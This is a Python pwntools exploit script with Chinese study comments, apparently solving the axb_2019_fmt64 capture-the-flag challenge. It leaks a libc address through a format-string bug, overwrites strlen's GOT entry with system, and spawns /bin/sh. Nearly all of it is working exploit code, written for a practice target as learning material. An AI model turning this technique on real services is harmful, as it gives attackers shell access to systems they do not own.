from pwn import *

r = remote('node5.buuoj.cn', 29534)
# r = process(r'./axb_2019_fmt64')
elf = ELF(r'./axb_2019_fmt64')
libc = ELF(r'../libc/libc6_2.23-0ubuntu11_amd64.so')
context.log_level = 'debug'

# 偏移为：8
# r.sendlineafter(b'tell me:', b'aaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
# r.recvuntil(b'Repeater:')
# print(r.recvuntil(b'\n'))

'''
# =======> 构造: payload = p64(printf_got) + b'%8$s' 会出现被\x00截断，导致printf的时候输出不了我们想要的

[DEBUG] Sent 0xd bytes:
    00000000  30 10 60 00  00 00 00 00  25 38 24 73  0a           │0·`·│····│%8$s│·│
    0000000d
[DEBUG] Received 0x1c bytes:
    00000000  52 65 70 65  61 74 65 72  3a 30 10 60  0a 50 6c 65  │Repe│ater│:0·`│·Ple│
    00000010  61 73 65 20  74 65 6c 6c  20 6d 65 3a               │ase │tell│ me:│

# ================> 这是64位下fmt会出现的问题，为了字符串不被截断，我们只能将地址给放在字符串的后面了
'''
printf_got = elf.got['printf']
puts_got = elf.got['puts']
strlen_got = elf.got['strlen']

# 不懂为啥printf@got地址泄露不了，这里泄露strlen@got的地址
payload = b'%9$s' + b'aaaa' + p64(puts_got)
r.sendlineafter(b'tell me:', payload)
r.recvuntil(b'Repeater:')
puts_addr = u64(r.recv(6).ljust(8, b'\x00'))  # 没开PIE（ASLR），一般是6位
# puts_got = u64(r.recvuntil(b'\x7f').ljust(8, b'\x00'))
print(f"puts_addr: {hex(puts_addr)}")

base_addr = puts_addr - libc.sym['puts']
system_addr = base_addr + libc.sym['system']
print(f"system_addr: {hex(system_addr)}")

# 修改printf@got => system@plt
# payload2 = fmtstr_payload(8, {printf_got: system_addr}, numbwritten=0x9)  # 报错，要手工写
# r.sendlineafter(b'tell me:', payload2)
# r.send(b'/bin/sh\x00')
# r.interactive()

'''
# 观察同泄露的puts地址和system地址, 因为都是在同一个libc中，只有后三位是不同的：
puts_addr:   0x786bd3687be0
system_addr: 0x786bd3658750
只修改后三位：\x50\x87\x65即可
'''
'''
# system_addr_min = hex(system_addr)[6:]
# first = int(system_addr_min[6:8], 16)  # \x50
# second = int(system_addr_min[4:6], 16)  # \x87
# third = int(system_addr_min[2:4], 16)  # \x65
first = system_addr & 0xff
second = (system_addr & 0xff00) >> 8
third = (system_addr & 0xff0000) >> 16

print(f"first: {hex(first)}")
print(f"second: {hex(second)}")
print(f"third: {hex(third)}")

# 由于地址具有随机性，所以要假设随机到后三位是递增的才好修改地址
if not (first < second < third):
    quit(-1)

first -= 9  # 前面已经输出了9个字符——Repeater:
payload2 = '%' + str(first) + 'c%$14hhn'
payload2 += '%' + str(second - first) + 'c%15$hhn'
payload2 += '%' + str(third - second) + 'c%16$hhn'
payload2 = payload2.ljust(0x30, 'A')  # 偏移从8+(48/8)=14
payload2 = payload2.encode('utf-8')
payload2 += p64(strlen_got) + p64(strlen_got + 1) + p64(strlen_got + 2)
'''

'''
hex(sss1)                >>>  '0x791d88858750'  # system_addr
hex(sss1 & 0xffff)       >>>  '0x8750'  → 提取低 16 位
hex(sss1 >> 16 & 0xffff) >>>  '0x8885'  → 提取高 16 位

* sss1 & 0xffff 解释：
0xffff 是十六进制常量，二进制表示为 16 个连续的 1（0b1111111111111111）。
当使用 &（按位与）运算时，会保留 hex_addr 中低 16 位的原始值，并将高 16 位清零。
hex_addr       → 0001 0010 0011 0100 0101 0110 0111 1000 （二进制）
0xffff         → 0000 0000 0000 0000 1111 1111 1111 1111 （二进制）
按位与运算结果 → 0000 0000 0000 0000 0101 0110 0111 1000 （二进制）
即 0x5678（低16位）

* sss1 >> 16 & 0xffff
① 右移16位：hex_addr >> 16  
   0001 0010 0011 0100 0101 0110 0111 1000  
   → 右移16位后 → 0000 0000 0000 0000 0001 0010 0011 0100 （二进制）
② 按位与 0xffff：  
   结果 → 0000 0000 0000 0000 0001 0010 0011 0100 （二进制）  
   即 0x1234（高16位）
'''

system_low = system_addr & 0xffff         # 提取低 16 位
system_high = system_addr >> 16 & 0xffff  # 提取高 16 位

print(f"system_high: {hex(system_high)}")
print(f"system_low: {hex(system_low)}")

# 如果高16位大于低16位的话，就从小的开始填充，使用$hn来一次填充4个字节。
# 注意前面已经输出了9个字符 (Repeater:)
if system_high > system_low:
    payload3 = '%' + str(system_low - 9) + 'c%12$hn' + '%' + str(system_high - system_low) + 'c%13$hn'
    payload3 = payload3.ljust(32, 'A')  # 偏移从8+(32/8)=12
    payload3 = payload3.encode('utf-8')
    payload3 += p64(strlen_got) + p64(strlen_got + 2)
else:
    payload3 = '%' + str(system_high - 9) + 'c%12$hn' + '%' + str(system_low - system_high) + 'c%13$hn'
    payload3 = payload3.ljust(32, 'A')
    payload3 = payload3.encode('utf-8')
    payload3 += p64(strlen_got + 2) + p64(strlen_got)

r.sendlineafter(b'tell me:', payload3)
r.sendlineafter(b'tell me:', b'||/bin/sh\x00')
r.interactive()
